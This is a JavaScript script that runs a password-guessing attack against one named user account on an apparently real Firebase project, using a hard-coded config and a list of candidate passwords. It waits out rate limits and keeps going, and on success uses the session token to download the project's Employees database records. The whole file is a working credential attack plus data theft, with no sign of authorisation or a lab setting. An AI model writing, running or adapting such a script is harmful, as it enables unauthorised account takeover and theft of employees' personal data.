import { initializeApp } from 'firebase/app';
import { getAuth, signInWithEmailAndPassword } from 'firebase/auth';

const firebaseConfig = {
  apiKey: "AIzaSyDTUan3f_kGG43rU6nBk6tBNyGV7lDBUUM",
  authDomain: "presencepro-ptb.firebaseapp.com",
  projectId: "presencepro-ptb",
  storageBucket: "presencepro-ptb.firebasestorage.app",
  messagingSenderId: "899670758678",
  appId: "1:899670758678:web:fc8c485a6702a1648fac37",
  measurementId: "G-SV1SSCGC42",
  databaseURL: "https://presencepro-ptb-default-rtdb.firebaseio.com"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

const passwords = [
  'samdev',
  'sam.dev',
  'samdev123',
  'sam.dev123',
  'samdev@123',
  'sam.dev@123',
  'sam123',
  'sam@123',
  'ptb123',
  'ptb@123',
  'ptbsam',
  'samptb',
  'password',
  'password123',
  'admin',
  'admin123',
  'admin@123',
  'presencepro',
  'presencepro123',
  '123456',
  '12345678'
];

async function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function main() {
  const email = 'sam.dev@ptb.com';
  for (const pw of passwords) {
    try {
      console.log(`Trying ${email} with password: "${pw}"...`);
      const cred = await signInWithEmailAndPassword(auth, email, pw);
      console.log(`\nSUCCESS! Password for ${email} is "${pw}"`);
      const token = await cred.user.getIdToken();
      
      const empUrl = `https://presencepro-ptb-default-rtdb.firebaseio.com/Employees.json?auth=${token}`;
      const res = await fetch(empUrl);
      console.log("Fetch status:", res.status);
      const data = await res.json();
      console.log("Data:", data);
      process.exit(0);
    } catch (err) {
      console.log(`Failed for "${pw}":`, err.code || err.message);
      if (err.code === 'auth/too-many-requests') {
        console.log("Hit rate limit. Sleeping for 15 seconds...");
        await sleep(15000);
      } else {
        await sleep(1000); // 1s delay to be safe
      }
    }
  }
  console.log("All passwords failed.");
}

main();
